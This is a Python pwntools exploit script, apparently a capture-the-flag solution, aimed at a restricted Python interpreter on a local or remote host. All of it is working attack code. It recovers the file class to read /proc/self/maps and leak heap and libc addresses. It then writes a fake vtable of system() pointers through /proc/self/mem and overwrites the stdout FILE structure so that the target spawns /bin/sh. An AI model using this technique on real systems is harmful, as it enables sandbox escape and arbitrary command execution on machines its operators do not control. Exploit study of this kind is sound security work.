#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

if "remote" in sys.argv:
    r = remote("192.168.201.5", 10000)
else:
    r = process(["./python", "-i"])

libc = ELF("../../libc.so.6")

r.send("""
import sys
file = sys.stdout.__class__

def open(name, mode):
    f = file.__new__(file)
    f.__init__(name, mode)
    return f

maps = open("/proc/self/maps", "r").read()
print "==maps==" + maps + "==maps=="
""")
r.recvuntil("==maps==")
maps = r.recvuntil("==maps==", drop=True)

heap = int(re.findall(r".*\[heap\]", maps)[0].split("-")[0], 16)
libc_base = int(re.findall(r".*libc-.*", maps)[0].split("-")[0], 16)

log.info("heap = " + hex(heap))
log.info("libc = " + hex(libc_base))

libc.address = libc_base

vtable = p64(libc.symbols["system"]) * 20
vtable = "".join("\\x%02x" % ord(x) for x in vtable)
vtable_adr = p64(heap+0x10000)
vtable_adr = "".join("\\x%02x" % ord(x) for x in vtable_adr)

r.send("""
heap = {heap}
stdout = {stdout}

w = open("/proc/self/mem", "wb")

# create fake vtable on heap
w.seek(heap+0x10000)
w.write("{vtable}")

# overwrite stdout
w.seek(stdout)
w.write("/bin/sh\\0")
w.seek(stdout+0xd8)
w.write("{vtable_adr}")
w.close()
""".format(heap=heap, stdout=libc.symbols["_IO_2_1_stdout_"], vtable=vtable, vtable_adr=vtable_adr))
r.recvrepeat(0.5)

r.interactive()
